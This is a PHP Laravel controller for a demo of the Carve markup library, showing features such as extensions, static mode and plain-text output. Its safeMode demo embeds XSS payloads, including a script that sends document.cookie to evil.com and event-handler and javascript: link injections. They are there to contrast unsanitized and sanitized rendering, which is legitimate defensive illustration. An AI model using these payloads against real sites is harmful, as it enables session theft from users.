<?php

declare(strict_types=1);

namespace App\Http\Controllers;

use App\Http\Requests\ArticleRequest;
use App\Models\Article;
use Illuminate\Http\Request;
use Illuminate\View\View;
use MarkupCarve\LaravelCarve\Service\CarveConverterInterface;
use MarkupCarve\LaravelCarve\Service\CarveManager;

class DemoController extends Controller
{
    private const SAMPLE_DJOT = <<<'CARVE'
    # Welcome to Carve

    This is a paragraph with /emphasis/, *strong*, _underline_ and /*both combined*/.

    ## Features

    - Clean, consistent syntax
    - Task lists: `[x]` done, `[-]` dropped, `[>]` deferred
    - Much more!

    > One syntax, one meaning - and the same HTML from every implementation.
    ^ The Carve design principles

    ### Code Example

    ``` php
    $html = $carve->toHtml('Hello *world*!');
    ```

    Visit the [Carve organization](https://github.com/markup-carve) for more.
    CARVE;

    private const USER_CONTENT = <<<'CARVE'
    ## User Comment

    This is /user submitted/ content.

    It uses *safe mode* to prevent XSS:

    <script>alert('xss')</script>

    The script tag above will be escaped.
    CARVE;

    public function index(): View
    {
        return view('demo.index');
    }

    public function bladeDirective(): View
    {
        return view('demo.blade_directive', [
            'carve_content' => self::SAMPLE_DJOT,
            'user_content' => self::USER_CONTENT,
        ]);
    }

    public function facade(): View
    {
        return view('demo.facade');
    }

    public function service(CarveConverterInterface $carve, CarveManager $manager): View
    {
        return view('demo.service', [
            'html' => $carve->toHtml(self::SAMPLE_DJOT),
            'text' => $carve->toText(self::SAMPLE_DJOT),
            'safe_html' => $manager->toHtml(self::USER_CONTENT, 'user_content'),
            'carve_source' => self::SAMPLE_DJOT,
            'user_source' => self::USER_CONTENT,
        ]);
    }

    public function form(Request $request, CarveConverterInterface $carve): View
    {
        $article = new Article();
        $article->title = $request->session()->get('article.title', '');
        $article->body = $request->session()->get('article.body', self::SAMPLE_DJOT);
        $article->comment = $request->session()->get('article.comment');

        $preview = $request->session()->get('article.preview');

        return view('demo.form', [
            'article' => $article,
            'preview' => $preview,
        ]);
    }

    public function formSubmit(ArticleRequest $request, CarveConverterInterface $carve): \Illuminate\Http\RedirectResponse
    {
        $data = $request->validated();
        $manager = app(CarveManager::class);

        $preview = [
            'title' => $data['title'],
            'body_html' => $carve->toHtml($data['body']),
            'comment_html' => !empty($data['comment'])
                ? $manager->toHtml($data['comment'], 'user_content')
                : null,
        ];

        return redirect()->route('form')
            ->with('article.title', $data['title'])
            ->with('article.body', $data['body'])
            ->with('article.comment', $data['comment'] ?? null)
            ->with('article.preview', $preview);
    }

    public function staticMode(CarveManager $manager): View
    {
        $source = <<<'CARVE'
        ::: details "How does degradation work?"
        The disclosure stays a native `<details>` element; in static mode it
        renders `open` so nothing is hidden on paper.
        :::

        Math survives too: $`E = mc^2`.
        CARVE;

        return view('demo.static_mode', [
            'source' => $source,
            'interactive_html' => $manager->toHtml($source, 'default'),
            'static_html' => $manager->toHtml($source, 'print'),
        ]);
    }

    public function safeMode(CarveConverterInterface $carve, CarveManager $manager): View
    {
        $maliciousContent = <<<'CARVE'
        # User Post

        Normal content here.

        <script>document.location='https://evil.com/?cookie='+document.cookie</script>

        <img src="x" onerror="alert('XSS')">

        <div onmouseover="alert('XSS')">Hover me</div>

        [Click me](javascript:alert('XSS'))

        More normal content.
        CARVE;

        return view('demo.safe_mode', [
            'source' => $maliciousContent,
            'unsafe_html' => $carve->toHtml($maliciousContent),
            'safe_html' => $manager->toHtml($maliciousContent, 'user_content'),
        ]);
    }

    public function plainText(CarveConverterInterface $carve): View
    {
        return view('demo.plain_text', [
            'source' => self::SAMPLE_DJOT,
            'text' => $carve->toText(self::SAMPLE_DJOT),
        ]);
    }

    public function extensions(CarveManager $manager): View
    {
        $autolinkSource = <<<'CARVE'
        Check out https://github.com/markup-carve/carve for more info.

        Email us at hello@example.com for support.
        CARVE;

        $externalLinksSource = <<<'CARVE'
        Visit [our site](https://example.com) (internal) or [GitHub](https://github.com) (external).
        CARVE;

        $smartQuotesSource = <<<'CARVE'
        He said "Hello, world!" and she replied 'How are you?'

        It's a beautiful day -- don't you think?
        CARVE;

        $headingPermalinksSource = <<<'CARVE'
        # Introduction

        Some intro text.

        ## Getting Started

        More content here.

        ### Installation

        Install instructions.
        CARVE;

        $mentionsSource = <<<'CARVE'
        Thanks @dereuromark for the review!

        Also cc @teamlead for the docs review.
        CARVE;

        $tocSource = <<<'CARVE'
        ::: toc
        :::

        # Chapter 1

        Content for chapter 1.

        ## Section 1.1

        Subsection content.

        ## Section 1.2

        More content.

        # Chapter 2

        Chapter 2 content.
        CARVE;

        $wikilinksSource = <<<'CARVE'
        See [[Home]] for the main page.

        Related: [[Getting Started]] and [[API Reference]].
        CARVE;

        $defaultAttrsSource = <<<'CARVE'
        Here's an image:

        ![Photo](https://placehold.co/150)

        And a table:

        | Name | Role |
        |------|------|
        | Alice | Admin |
        | Bob | User |

        A [link](https://example.com) with default class.
        CARVE;

        $frontmatterSource = <<<'CARVE'
        ---yaml
        title: My Document
        author: John Doe
        date: 2026-01-15
        ---

        # Document Title

        This content has YAML frontmatter.
        CARVE;

        $semanticSource = <<<'CARVE'
        Press [Ctrl+C]{kbd} to copy.

        The term [API]{dfn="Application Programming Interface"} is important.

        [HTML]{abbr="HyperText Markup Language"} is the foundation of the web.
        CARVE;

        $mermaidSource = <<<'CARVE'
        ``` mermaid
        graph LR
            A[Write Carve] --> B{Render}
            B --> C[Interactive HTML]
            B --> D[Static / PDF]
        ```
        CARVE;

        $codeGroupSource = <<<'CARVE'
        ::: code-group
        ``` php [Composer]
        composer require markup-carve/laravel-carve
        ```

        ``` bash [NPM]
        npm install @example/carve
        ```

        ``` yaml [Docker]
        services:
          app:
            image: php:8.2
        ```
        :::
        CARVE;

        $admonitionSource = <<<'CARVE'
        ::: note
        This is a note.
        :::

        ::: warning Custom Title
        Be careful with this.
        :::

        ::: tip
        Carve supports admonitions out of the box.
        :::
        CARVE;

        return view('demo.extensions', [
            'autolink_source' => $autolinkSource,
            'autolink_html' => $manager->toHtml($autolinkSource),
            'external_links_source' => $externalLinksSource,
            'external_links_html' => $manager->toHtml($externalLinksSource),
            'smart_quotes_source' => $smartQuotesSource,
            'smart_quotes_html' => $manager->toHtml($smartQuotesSource),
            'heading_permalinks_source' => $headingPermalinksSource,
            'heading_permalinks_html' => $manager->toHtml($headingPermalinksSource),
            'mentions_source' => $mentionsSource,
            'mentions_html' => $manager->toHtml($mentionsSource, 'with_mentions'),
            'toc_source' => $tocSource,
            'toc_html' => $manager->toHtml($tocSource, 'with_toc'),
            'wikilinks_source' => $wikilinksSource,
            'wikilinks_html' => $manager->toHtml($wikilinksSource, 'with_wikilinks'),
            'default_attrs_source' => $defaultAttrsSource,
            'default_attrs_html' => $manager->toHtml($defaultAttrsSource, 'with_default_attrs'),
            'frontmatter_source' => $frontmatterSource,
            'frontmatter_html' => $manager->toHtml($frontmatterSource, 'with_frontmatter'),
            'semantic_source' => $semanticSource,
            'semantic_html' => $manager->toHtml($semanticSource, 'with_semantic'),
            'mermaid_source' => $mermaidSource,
            'mermaid_html' => $manager->toHtml($mermaidSource, 'with_mermaid'),
            'code_group_source' => $codeGroupSource,
            'code_group_html' => $manager->toHtml($codeGroupSource, 'with_code_group'),
            'admonition_source' => $admonitionSource,
            'admonition_html' => $manager->toHtml($admonitionSource, 'with_admonition'),
        ]);
    }
}
